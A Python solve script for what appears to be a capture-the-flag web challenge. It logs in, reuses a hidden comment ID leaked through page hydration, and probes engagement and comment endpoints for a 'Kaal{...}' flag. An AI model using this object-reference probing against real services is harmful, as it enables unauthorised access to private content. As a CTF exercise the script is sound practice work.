#!/usr/bin/env python3
"""
Get the final flag using the discovered comment ID
"""
import requests
import re

BASE_URL = "http://chall-35421a42.evt-207.glabs.ctf7.com"

print("="*80)
print("GETTING FINAL FLAG")
print("="*80)

session = requests.Session()

# Login
username = "hacker123"
password = "password123"
session.post(f"{BASE_URL}/api/login",
             json={"username": username, "password": password},
             timeout=10)

# The hidden comment ID from hydration
hidden_comment_id = "c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d"

print(f"\n[Hidden Comment ID]: {hidden_comment_id}")

# Try to access it via engagement endpoint
print(f"\n[Trying engagement endpoint]")
try:
    r = session.post(f"{BASE_URL}/api/v2/engagement",
                    json={"action": "heart", "entityType": "Comment", "entityId": hidden_comment_id},
                    timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text}")
    
    # Look for flag
    flags = re.findall(r'Kaal\{[^}]+\}', r.text)
    if flags:
        print(f"\n{'='*80}")
        print(f"✓✓✓ FOUND FLAG: {flags[0]}")
        print(f"{'='*80}")
except Exception as e:
    print(f"Error: {e}")

# Try other endpoints
print(f"\n[Trying other endpoints]")
endpoints = [
    f"/api/comments/{hidden_comment_id}",
    f"/api/comment/{hidden_comment_id}",
    f"/api/v2/comments/{hidden_comment_id}",
    f"/api/statuses/1/comments/{hidden_comment_id}",
    f"/api/statuses/1/comments",
]

for endpoint in endpoints:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
        if r.status_code == 200:
            print(f"\n✓ {endpoint}")
            print(f"  Status: {r.status_code}")
            print(f"  Response: {r.text}")
            
            flags = re.findall(r'Kaal\{[^}]+\}', r.text)
            if flags:
                print(f"\n{'='*80}")
                print(f"✓✓✓ FOUND FLAG: {flags[0]}")
                print(f"{'='*80}")
    except Exception as e:
        pass

# Try to get the comment content directly
print(f"\n[Trying to fetch comment via API]")
try:
    # Maybe there's a way to get all comments including hidden ones
    r = session.get(f"{BASE_URL}/api/statuses/1", timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text}")
except:
    pass

print("\n" + "="*80)
